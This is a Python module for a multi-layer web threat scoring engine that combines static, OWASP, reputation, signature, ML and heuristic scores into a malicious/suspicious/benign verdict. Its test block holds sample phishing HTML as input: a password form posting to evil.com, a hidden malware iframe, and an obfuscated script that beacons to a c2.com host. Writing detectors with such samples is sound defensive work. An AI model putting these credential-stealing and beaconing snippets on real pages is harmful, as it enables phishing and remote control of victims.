"""
UNIFIED RISK SCORING ENGINE
Combines all 6 security layers into a comprehensive risk assessment
"""

from datetime import datetime
from typing import Dict, List, Optional
import logging

# Import all security layers
try:
    from security_layers.static_analysis import StaticAnalyzer
    from security_layers.owasp_checker import OWASPChecker
    from security_layers.threat_intelligence import ThreatIntelligence
    from security_layers.signature_matcher import SignatureMatcher
    from security_layers.enhanced_ml import EnhancedMLAnalyzer
    from security_layers.behavioral_heuristics import BehavioralAnalyzer
except ImportError:
    # Fallback for direct imports
    from static_analysis import StaticAnalyzer
    from owasp_checker import OWASPChecker
    from threat_intelligence import ThreatIntelligence
    from signature_matcher import SignatureMatcher
    from enhanced_ml import EnhancedMLAnalyzer
    from behavioral_heuristics import BehavioralAnalyzer

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger('RiskEngine')


class UnifiedRiskEngine:
    """
    Enterprise-grade multi-layer security analysis engine
    
    Combines 6 detection layers:
    - Layer A: Static Analysis (fast lexical checks)
    - Layer B: OWASP Top 10 Checks (security vulnerabilities)
    - Layer C: Threat Intelligence (external reputation)
    - Layer D: Signature Matching (pattern-based detection)
    - Layer E: Enhanced Machine Learning (behavioral ML)
    - Layer F: Behavioral Heuristics (malicious patterns)
    
    Weighted scoring formula:
    overall_risk = (
        0.25 * ml_confidence +
        0.20 * static_analysis_score +
        0.20 * reputation_score +
        0.15 * heuristic_score +
        0.10 * signature_score +
        0.10 * owasp_risk_score
    )
    
    Classification:
    - overall_risk >= 70 → MALICIOUS
    - 40 <= overall_risk < 70 → SUSPICIOUS
    - overall_risk < 40 → BENIGN
    """
    
    # Layer weights (must sum to 1.0)
    WEIGHTS = {
        'ml': 0.25,           # Machine Learning (highest weight)
        'static': 0.20,       # Static Analysis
        'reputation': 0.20,   # Threat Intelligence
        'heuristic': 0.15,    # Behavioral Heuristics
        'signature': 0.10,    # Signature Matching
        'owasp': 0.10         # OWASP Security Checks
    }
    
    # Classification thresholds
    MALICIOUS_THRESHOLD = 70
    SUSPICIOUS_THRESHOLD = 40
    
    def __init__(self, api_keys: dict = None, base_ml_detector=None):
        """
        Initialize unified risk engine
        
        Args:
            api_keys: API keys for threat intelligence
            base_ml_detector: Existing ML detector to integrate
        """
        logger.info("🔧 Initializing Unified Risk Engine...")
        
        # Initialize all layers
        self.static_analyzer = StaticAnalyzer()
        self.owasp_checker = OWASPChecker()
        self.ti_checker = ThreatIntelligence(api_keys=api_keys)
        self.signature_matcher = SignatureMatcher()
        self.ml_analyzer = EnhancedMLAnalyzer(base_ml_detector=base_ml_detector)
        self.behavioral_analyzer = BehavioralAnalyzer()
        
        logger.info("✅ All 6 security layers initialized")
    
    def analyze(self, url: str, page_data: dict = None) -> dict:
        """
        Perform comprehensive multi-layer security analysis
        
        Args:
            url: URL to analyze
            page_data: Optional page content data
                {
                    'html': str,
                    'scripts': [{'src': str, 'content': str}],
                    'headers': dict,
                    'iframes': int,
                    'forms': int,
                    ...
                }
        
        Returns:
            dict: Complete analysis results
                {
                    'url': str,
                    'final_classification': 'MALICIOUS' | 'SUSPICIOUS' | 'BENIGN',
                    'overall_risk': float (0-100),
                    'risk_level': 'CRITICAL' | 'HIGH' | 'MEDIUM' | 'LOW',
                    
                    'layer_scores': {
                        'static_analysis': float,
                        'owasp_security': float,
                        'threat_intelligence': float,
                        'signature_matching': float,
                        'machine_learning': float,
                        'behavioral_heuristics': float
                    },
                    
                    'detailed_analysis': {
                        'static_analysis': {...},
                        'owasp_analysis': {...},
                        'threat_intelligence': {...},
                        'signature_matching': {...},
                        'machine_learning': {...},
                        'behavioral_heuristics': {...}
                    },
                    
                    'summary': {
                        'total_findings': int,
                        'critical_findings': int,
                        'warning_findings': int,
                        'info_findings': int,
                        'threats_detected': [str],
                        'vulnerabilities_found': [str]
                    },
                    
                    'timestamp': str,
                    'analysis_duration': float
                }
        """
        start_time = datetime.now()
        logger.info(f"\n{'='*80}")
        logger.info(f"🔍 Starting multi-layer analysis for: {url}")
        logger.info(f"{'='*80}\n")
        
        try:
            # Extract domain for TI checks
            from urllib.parse import urlparse
            domain = urlparse(url).netloc
            
            # Run all 6 layers in parallel (where possible)
            layer_results = self._run_all_layers(url, domain, page_data)
            
            # Calculate weighted overall risk
            overall_risk = self._calculate_overall_risk(layer_results)
            
            # Determine final classification
            final_classification = self._classify_risk(overall_risk, layer_results)
            
            # Generate risk level
            risk_level = self._determine_risk_level(overall_risk)
            
            # Extract layer scores
            layer_scores = self._extract_layer_scores(layer_results)
            
            # Generate summary
            summary = self._generate_summary(layer_results, final_classification)
            
            # Calculate analysis duration
            duration = (datetime.now() - start_time).total_seconds()
            
            # Compile final result
            result = {
                'url': url,
                'final_classification': final_classification,
                'overall_risk': round(overall_risk, 2),
                'risk_level': risk_level,
                
                'layer_scores': layer_scores,
                'detailed_analysis': layer_results,
                'summary': summary,
                
                'timestamp': datetime.now().isoformat(),
                'analysis_duration': round(duration, 3),
                'status': 'completed'
            }
            
            logger.info(f"\n{'='*80}")
            logger.info(f"✅ Analysis Complete:")
            logger.info(f"   Classification: {final_classification}")
            logger.info(f"   Overall Risk: {overall_risk:.2f}/100")
            logger.info(f"   Risk Level: {risk_level}")
            logger.info(f"   Duration: {duration:.2f}s")
            logger.info(f"{'='*80}\n")
            
            return result
            
        except Exception as e:
            logger.error(f"❌ Analysis error: {str(e)}")
            return {
                'url': url,
                'final_classification': 'UNKNOWN',
                'overall_risk': 0,
                'risk_level': 'UNKNOWN',
                'error': str(e),
                'status': 'error',
                'timestamp': datetime.now().isoformat()
            }
    
    def _run_all_layers(self, url: str, domain: str, page_data: dict) -> dict:
        """Execute all 6 security layers"""
        results = {}
        
        # Layer A: Static Analysis (always runs - fast)
        logger.info("🔍 Layer A: Static Analysis...")
        try:
            results['static_analysis'] = self.static_analyzer.analyze(url, page_data)
            logger.info(f"   ✓ Risk Score: {results['static_analysis']['risk_score']}/100")
        except Exception as e:
            logger.error(f"   ✗ Error: {e}")
            results['static_analysis'] = {'risk_score': 0, 'status': 'error', 'error': str(e)}
        
        # Layer B: OWASP Checks (requires page data)
        logger.info("🔍 Layer B: OWASP Security Checks...")
        try:
            results['owasp_analysis'] = self.owasp_checker.analyze(url, page_data)
            logger.info(f"   ✓ Risk Score: {results['owasp_analysis']['risk_score']}/100")
        except Exception as e:
            logger.error(f"   ✗ Error: {e}")
            results['owasp_analysis'] = {'risk_score': 0, 'status': 'error', 'error': str(e)}
        
        # Layer C: Threat Intelligence (may be slow - has caching)
        logger.info("🔍 Layer C: Threat Intelligence...")
        try:
            results['threat_intelligence'] = self.ti_checker.analyze(url, domain)
            score = results['threat_intelligence']['reputation_score']
            # Convert reputation (100=good, 0=bad) to risk (0=good, 100=bad)
            results['threat_intelligence']['risk_score'] = 100 - score
            logger.info(f"   ✓ Reputation: {score}/100")
        except Exception as e:
            logger.error(f"   ✗ Error: {e}")
            results['threat_intelligence'] = {'reputation_score': 50, 'risk_score': 50, 'status': 'error', 'error': str(e)}
        
        # Layer D: Signature Matching
        logger.info("🔍 Layer D: Signature Matching...")
        try:
            results['signature_matching'] = self.signature_matcher.analyze(url, page_data)
            logger.info(f"   ✓ Signature Score: {results['signature_matching']['signature_score']}/100")
        except Exception as e:
            logger.error(f"   ✗ Error: {e}")
            results['signature_matching'] = {'signature_score': 0, 'status': 'error', 'error': str(e)}
        
        # Layer E: Enhanced ML
        logger.info("🔍 Layer E: Machine Learning...")
        try:
            results['machine_learning'] = self.ml_analyzer.analyze(url, page_data)
            logger.info(f"   ✓ ML Confidence: {results['machine_learning']['ml_confidence']}%")
        except Exception as e:
            logger.error(f"   ✗ Error: {e}")
            results['machine_learning'] = {'ml_confidence': 0, 'risk_score': 0, 'status': 'error', 'error': str(e)}
        
        # Layer F: Behavioral Heuristics
        logger.info("🔍 Layer F: Behavioral Heuristics...")
        try:
            results['behavioral_heuristics'] = self.behavioral_analyzer.analyze(url, page_data)
            logger.info(f"   ✓ Heuristic Score: {results['behavioral_heuristics']['heuristic_score']}/100")
        except Exception as e:
            logger.error(f"   ✗ Error: {e}")
            results['behavioral_heuristics'] = {'heuristic_score': 0, 'status': 'error', 'error': str(e)}
        
        return results
    
    def _calculate_overall_risk(self, layer_results: dict) -> float:
        """
        Calculate weighted overall risk score
        
        Formula:
        overall_risk = (
            0.25 * ml_confidence +
            0.20 * static_analysis_score +
            0.20 * (100 - reputation_score) +
            0.15 * heuristic_score +
            0.10 * signature_score +
            0.10 * owasp_risk_score
        )
        """
        ml_score = layer_results.get('machine_learning', {}).get('risk_score', 0)
        static_score = layer_results.get('static_analysis', {}).get('risk_score', 0)
        ti_risk_score = layer_results.get('threat_intelligence', {}).get('risk_score', 50)
        signature_score = layer_results.get('signature_matching', {}).get('signature_score', 0)
        owasp_score = layer_results.get('owasp_analysis', {}).get('risk_score', 0)
        heuristic_score = layer_results.get('behavioral_heuristics', {}).get('heuristic_score', 0)
        
        overall_risk = (
            self.WEIGHTS['ml'] * ml_score +
            self.WEIGHTS['static'] * static_score +
            self.WEIGHTS['reputation'] * ti_risk_score +
            self.WEIGHTS['heuristic'] * heuristic_score +
            self.WEIGHTS['signature'] * signature_score +
            self.WEIGHTS['owasp'] * owasp_score
        )
        
        return min(100, max(0, overall_risk))
    
    def _classify_risk(self, overall_risk: float, layer_results: dict) -> str:
        """
        Determine final classification based on risk score and layer results
        
        Returns: 'MALICIOUS', 'SUSPICIOUS', or 'BENIGN'
        """
        # Check if any critical signatures detected
        signature_matches = layer_results.get('signature_matching', {}).get('matches', [])
        if any('critical' in str(m).lower() or 'exploit' in str(m).lower() for m in signature_matches):
            return 'MALICIOUS'
        
        # Check ML prediction
        ml_pred = layer_results.get('machine_learning', {}).get('prediction', 'UNKNOWN')
        if ml_pred == 'MALICIOUS' and overall_risk >= 60:
            return 'MALICIOUS'
        
        # Standard threshold classification
        if overall_risk >= self.MALICIOUS_THRESHOLD:
            return 'MALICIOUS'
        elif overall_risk >= self.SUSPICIOUS_THRESHOLD:
            return 'SUSPICIOUS'
        else:
            return 'BENIGN'
    
    def _determine_risk_level(self, overall_risk: float) -> str:
        """Determine risk level for UI display"""
        if overall_risk >= 85:
            return 'CRITICAL'
        elif overall_risk >= 70:
            return 'HIGH'
        elif overall_risk >= 40:
            return 'MEDIUM'
        else:
            return 'LOW'
    
    def _extract_layer_scores(self, layer_results: dict) -> dict:
        """Extract normalized scores from each layer"""
        return {
            'static_analysis': layer_results.get('static_analysis', {}).get('risk_score', 0),
            'owasp_security': layer_results.get('owasp_analysis', {}).get('risk_score', 0),
            'threat_intelligence': layer_results.get('threat_intelligence', {}).get('reputation_score', 50),
            'signature_matching': layer_results.get('signature_matching', {}).get('signature_score', 0),
            'machine_learning': layer_results.get('machine_learning', {}).get('ml_confidence', 0),
            'behavioral_heuristics': layer_results.get('behavioral_heuristics', {}).get('heuristic_score', 0)
        }
    
    def _generate_summary(self, layer_results: dict, classification: str) -> dict:
        """Generate executive summary of findings"""
        all_findings = []
        critical_count = 0
        warning_count = 0
        info_count = 0
        threats = set()
        vulnerabilities = []
        
        # Collect findings from all layers
        for layer_name, layer_data in layer_results.items():
            findings = layer_data.get('findings', [])
            all_findings.extend(findings)
            
            # Count by severity
            for finding in findings:
                if '🚨' in finding or 'critical' in finding.lower():
                    critical_count += 1
                    # Extract threat names
                    if 'detected' in finding.lower():
                        threat = finding.split(':')[1].strip() if ':' in finding else finding
                        threats.add(threat)
                elif '⚠️' in finding or 'warning' in finding.lower():
                    warning_count += 1
                else:
                    info_count += 1
            
            # Collect vulnerabilities from OWASP
            if layer_name == 'owasp_analysis':
                vuln_count = layer_data.get('vulnerability_count', 0)
                if vuln_count > 0:
                    vulnerabilities.extend(findings[:5])  # Top 5
        
        return {
            'total_findings': len(all_findings),
            'critical_findings': critical_count,
            'warning_findings': warning_count,
            'info_findings': info_count,
            'classification': classification,
            'threats_detected': list(threats)[:10],  # Top 10
            'vulnerabilities_found': vulnerabilities[:5],  # Top 5
            'all_findings': all_findings
        }


# Quick test
if __name__ == "__main__":
    # Test with suspicious URL
    engine = UnifiedRiskEngine()
    
    test_url = "https://paypal-verify.suspicious-site.tk/login?redirect=http://192.168.1.1"
    test_data = {
        'html': '''
            <form action="https://evil.com/steal">
                <input type="password" name="password">
                <input type="text" name="email">
            </form>
            <iframe style="display:none" src="http://malware.com"></iframe>
            <p>Your account has been suspended! Verify immediately!</p>
        ''',
        'scripts': [
            {'content': 'eval(atob("malicious")); setInterval(function(){fetch("http://c2.com/beacon")}, 5000);'}
        ],
        'headers': {},
        'iframes': 2,
        'forms': 1
    }
    
    result = engine.analyze(test_url, test_data)
    
    print(f"\n{'='*80}")
    print(f"UNIFIED RISK ANALYSIS REPORT")
    print(f"{'='*80}")
    print(f"URL: {result['url']}")
    print(f"Classification: {result['final_classification']}")
    print(f"Overall Risk: {result['overall_risk']}/100")
    print(f"Risk Level: {result['risk_level']}")
    print(f"\nLayer Scores:")
    for layer, score in result['layer_scores'].items():
        print(f"  {layer}: {score}/100")
    print(f"\nSummary:")
    print(f"  Total Findings: {result['summary']['total_findings']}")
    print(f"  Critical: {result['summary']['critical_findings']}")
    print(f"  Warnings: {result['summary']['warning_findings']}")
    print(f"  Info: {result['summary']['info_findings']}")
    print(f"\nThreats Detected: {', '.join(result['summary']['threats_detected'])}")
    print(f"{'='*80}\n")
